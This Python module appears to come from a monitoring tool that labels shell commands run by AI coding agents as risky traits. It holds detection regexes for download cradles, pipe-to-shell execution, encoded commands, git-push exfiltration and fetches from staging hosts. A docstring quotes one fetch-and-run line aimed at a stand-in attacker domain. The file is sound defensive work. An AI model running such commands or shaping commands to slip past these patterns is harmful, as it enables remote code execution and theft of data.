"""Command classification shared by the sequence rules and the hook client.

The default privacy configuration hashes tool arguments inside the hook process
and never stores command text, which left every command-regex rule blind on real
captured traffic: the demo and the tests injected `command`, production events
did not have one. The fix is to classify the command *where the plaintext is
still visible* — in the hook, before hashing — and ship only category labels
(`tool.traits`). No command text leaves the machine; the rules match the labels
when the text is absent.

This module is imported by scripts/agentmetry_ingest.py via the same sys.path
mechanism as the DLP scanner, so it must stay dependency-free: `re` only, no
core.config, no pydantic.

Rule docstrings explaining each pattern's provenance stay in rules.py; this
module owns the regexes so the hook and the rules cannot drift apart.
"""

from __future__ import annotations

import re

# A raw-IP URL and a download/execute verb in the same command is a classic
# malware download cradle. Legit tooling uses domains and package managers.
RAW_IP_URL = re.compile(r"https?://((?:\d{1,3}\.){3}\d{1,3})")
# Loopback is not ingress — fetching your own orchestrator's health endpoint
# must not read as a download cradle (see rules.py for the war story).
LOOPBACK_IP = re.compile(r"^(?:127(?:\.\d{1,3}){3}|0\.0\.0\.0)$")
# Every URL host in a command, so a pipe-to-interpreter can be judged by where it
# actually points rather than by shape alone.
URL_HOST = re.compile(r"https?://(\[[0-9a-f:]+\]|[^/\s:'\"]+)", re.IGNORECASE)
# The same machine, spelled the several ways people spell it. `0.0.0.0` is here
# because curling your own bound service by that address is common, even though
# it means "all interfaces" when binding rather than when connecting.
LOOPBACK_HOST = re.compile(
    r"^(?:127(?:\.\d{1,3}){3}|0\.0\.0\.0|localhost|\[::1\]|\[::ffff:127(?:\.\d{1,3}){3}\])$",
    re.IGNORECASE,
)
DOWNLOAD_EXEC = re.compile(
    r"downloadstring|downloadfile|invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b|"
    r"certutil|bitsadmin|invoke-expression|\biex\b",
    re.IGNORECASE,
)
ENCODED_CMD = re.compile(r"-enc(odedcommand)?\b|frombase64string", re.IGNORECASE)

# Fetch remote content and feed it straight to an interpreter (ADI §4.2).
PIPE_TO_SHELL = re.compile(
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b[^|;&]*[|]\s*"
    r"(sudo\s+)?\b(ba|z|k|da)?sh\b|"
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b[^|;&]*[|]\s*"
    r"(iex|invoke-expression|python\d?|perl|ruby|node)\b",
    re.IGNORECASE,
)

# `bash: rm -rf build/` is a deletion even though the tool is named "Bash".
DELETE_COMMAND = re.compile(
    r"\brm\s+(-[a-z]*\s+)*|\brmdir\b|\bunlink\b|remove-item\b|\bdel\s+/", re.IGNORECASE
)

# Content an outsider can author (gh issues/PRs, git fetch) — ADI provenance.
UNTRUSTED_INPUT_COMMAND = re.compile(
    r"\bgh\s+(issue|pr)\s+(view|list|diff|comment)|"
    r"\bgit\s+(fetch|pull|clone)\b",
    re.IGNORECASE,
)

# PR review provenance (ADI §4.3): description vs code vs merge.
PR_DESC_COMMAND = re.compile(r"\bgh\s+pr\s+view\b", re.IGNORECASE)
PR_COMMIT_COMMAND = re.compile(
    r"\bgh\s+pr\s+(diff|checkout|files)\b|\bgit\s+show\b", re.IGNORECASE
)
PR_MERGE_COMMAND = re.compile(r"\bgh\s+pr\s+merge\b|\bgit\s+merge\b", re.IGNORECASE)

# Cloud and cluster APIs used after credential harvest (HF July 2026 lateral phase).
CLOUD_API = re.compile(
    r"\bkubectl\b|"
    r"(?:^|\s)aws\s+\w|"
    r"\bgcloud\b|"
    r"\baz\s+(?:account|login|keyvault|aks|storage)\b|"
    r"\b(?:hf|huggingface-cli)\b|"
    r"\baliyun\b|\btencentcloud\b|\bbce\b|\bossutil\b|\bcoscmd\b",
    re.IGNORECASE,
)

# Push harvested material to a remote the operator did not intend (Nx s1ngularity).
GIT_EXFIL = re.compile(
    r"\bgit\s+push\b|"
    r"\bgh\s+repo\s+(?:create|sync)\b|"
    r"\bgh\s+release\s+upload\b",
    re.IGNORECASE,
)

# Public staging hosts used for agent C2 (gist, HF raw files, GitHub raw content).
STAGING_HOST = re.compile(
    r"https?://(?:[\w-]+\.)?(?:"
    r"githubusercontent\.com|gist\.github\.com|raw\.github\.com|"
    r"huggingface\.co|pastebin\.com|gitlab\.com|bitbucket\.org"
    r")",
    re.IGNORECASE,
)
STAGING_FETCH = re.compile(
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b",
    re.IGNORECASE,
)
# Second-step execution after a staged download — excludes package managers.
RISKY_EXEC_AFTER_STAGING = re.compile(
    r"\b(bash|sh|zsh|dash)\s+[\w./~-]+\.(?:sh|bash)\b|"
    r"\bpython\d?\s+[\w./~-]+\.py\b|"
    r"\bpython\d?\s+-c\b|"
    r"\b(iex|invoke-expression|eval)\b|"
    r"\bpowershell(?:\.exe)?\s+-(?:enc|f|file)\b",
    re.IGNORECASE,
)
BENIGN_AFTER_STAGING = re.compile(
    r"\b(npm|yarn|pnpm|pip|pip3|cargo|go)\s+(?:install|run|build)\b",
    re.IGNORECASE,
)

# Stable vocabulary. Renaming a trait is a breaking change for stored events:
# rules match these strings on events that may be replayed months later.
KNOWN_TRAITS = frozenset({
    "raw_ip_fetch",
    "encoded_cmd",
    "pipe_to_shell",
    "pipe_to_shell_local",
    "cloud_api",
    "git_exfil",
    "staging_fetch",
    "risky_exec",
    "delete_cmd",
    "untrusted_input",
    "pr_desc",
    "pr_commit",
    "pr_merge",
})


# A heredoc opener: `<<EOF`, `<<-EOF`, `<< 'PY'`, `<<"SQL"`.
_HEREDOC_OPEN = re.compile(r"<<-?\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1")


def mask_literals(command: str) -> str:
    """Blank out quoted strings and heredoc bodies, preserving length and layout.

    Trait regexes match command text, which cannot tell performing an action from
    writing about one. A command whose *content* was the string
    `gh pr merge 42 --squash` fired `pr-merged-without-review` at critical, and no
    pull request was merged: the text was being written into a test fixture.

    That failure lands hardest on the people most likely to adopt this. Anyone
    authoring detection content, security documentation, or corpus cases spends
    their day typing the exact strings the rules hunt for, and a security tool
    that punishes you for writing about security gets uninstalled.

    Masking rather than deleting keeps every offset intact, so a caller can still
    reason about where in the original command a match sat.

    This is a heuristic and is meant to be. Full shell quoting is a parser's job,
    and a parser that is wrong about an exotic case fails closed in a way nobody
    can debug from a hashed command. The shapes handled here -- single quotes,
    double quotes, heredocs -- are the ones that actually produced false
    positives. Anything it cannot account for stays visible, so the failure mode
    is a trait that still fires rather than one that silently stops.
    """
    if not command or not isinstance(command, str):
        return command or ""

    out = list(command)
    i = 0
    n = len(command)
    quote: str | None = None

    while i < n:
        ch = command[i]

        if quote is None:
            # A heredoc body is content by definition, whatever it contains.
            m = _HEREDOC_OPEN.match(command, i)
            if m:
                delimiter = m.group(2)
                body_start = command.find("\n", m.end())
                if body_start == -1:
                    i = m.end()
                    continue
                body_start += 1
                end = n
                for line_start, line in _iter_lines(command, body_start):
                    if line.strip() == delimiter:
                        end = line_start
                        break
                for j in range(body_start, min(end, n)):
                    if out[j] != "\n":
                        out[j] = " "
                i = min(end, n)
                continue
            if ch in ("'", '"'):
                quote = ch
                out[i] = " "
            i += 1
            continue

        # Inside a quote.
        if ch == "\\" and quote == '"' and i + 1 < n:
            out[i] = " "
            out[i + 1] = " "
            i += 2
            continue
        if ch == quote:
            quote = None
            out[i] = " "
            i += 1
            continue
        if ch != "\n":
            out[i] = " "
        i += 1

    return "".join(out)


def _iter_lines(text: str, start: int):
    """(offset, line) for each line from `start`, so a heredoc end can be located."""
    idx = start
    while idx < len(text):
        nl = text.find("\n", idx)
        if nl == -1:
            yield idx, text[idx:]
            return
        yield idx, text[idx:nl]
        idx = nl + 1


def pipes_only_loopback(command: str) -> bool:
    """True when every URL in a pipe-to-interpreter command points at this host.

    `curl http://127.0.0.1:8000/api/v1/audit/status | python -c ...` has the exact
    shape of a download cradle and none of the substance: nothing crosses the
    network and nothing untrusted is executed. Querying your own dev server and
    piping the JSON into an interpreter is a thing developers do several times an
    hour, and this fired at critical on it.

    That is not a cosmetic problem. A critical which fires several times a day on
    normal work does not stay a critical: it becomes the alert people learn to
    scroll past, and by the time a real cradle appears the rule has already lost
    its reader. The DLP manifest records the same lesson from the other side,
    where a bare 40-char pattern matched every git commit SHA.

    Deliberately conservative in two ways.

    Loopback is excluded specifically, rather than remote being required. An
    earlier version of the rule demanded a bare IP address, which let
    `curl https://evil-cdn.example.com/x.sh | bash` straight through -- and a
    domain is what a real attacker uses. Any host that is not provably loopback
    keeps the full-strength trait.

    A command with no URL we can read is treated as remote. `curl $URL | bash`
    resolves at runtime, so we cannot prove where it points, and guessing in the
    quiet direction is how a recorder goes blind.
    """
    hosts = URL_HOST.findall(command or "")
    if not hosts:
        return False
    return all(LOOPBACK_HOST.match(h) for h in hosts)


def classify_command(command: str) -> list[str]:
    """Map a plaintext command to detection trait labels (never the text itself)."""
    if not command or not isinstance(command, str):
        return []
    traits: list[str] = []

    remote_ips = [ip for ip in RAW_IP_URL.findall(command) if not LOOPBACK_IP.match(ip)]
    if remote_ips and DOWNLOAD_EXEC.search(command):
        traits.append("raw_ip_fetch")
    if ENCODED_CMD.search(command):
        traits.append("encoded_cmd")
    if PIPE_TO_SHELL.search(command):
        traits.append(
            "pipe_to_shell_local" if pipes_only_loopback(command) else "pipe_to_shell"
        )
    if CLOUD_API.search(command):
        traits.append("cloud_api")
    if GIT_EXFIL.search(command):
        traits.append("git_exfil")
    if STAGING_HOST.search(command) and (
        STAGING_FETCH.search(command) or DOWNLOAD_EXEC.search(command)
    ):
        traits.append("staging_fetch")
    if not BENIGN_AFTER_STAGING.search(command) and (
        PIPE_TO_SHELL.search(command) or RISKY_EXEC_AFTER_STAGING.search(command)
    ):
        traits.append("risky_exec")
    if DELETE_COMMAND.search(command):
        traits.append("delete_cmd")
    if UNTRUSTED_INPUT_COMMAND.search(command):
        traits.append("untrusted_input")
    # The PR traits read a masked copy: a command that *writes* `gh pr merge`
    # into a file is not merging anything, and treating it as though it were
    # fired `pr-merged-without-review` at critical on someone authoring a test
    # fixture (issue #24).
    #
    # Only these three for now. The same confusion exists for other text traits,
    # and the general fix means understanding shell quoting properly, so each
    # trait wants its own corpus case before its semantics change. These are the
    # ones with a reproducer.
    written = mask_literals(command)
    if PR_DESC_COMMAND.search(written):
        traits.append("pr_desc")
    if PR_COMMIT_COMMAND.search(written):
        traits.append("pr_commit")
    if PR_MERGE_COMMAND.search(written):
        traits.append("pr_merge")
    return traits
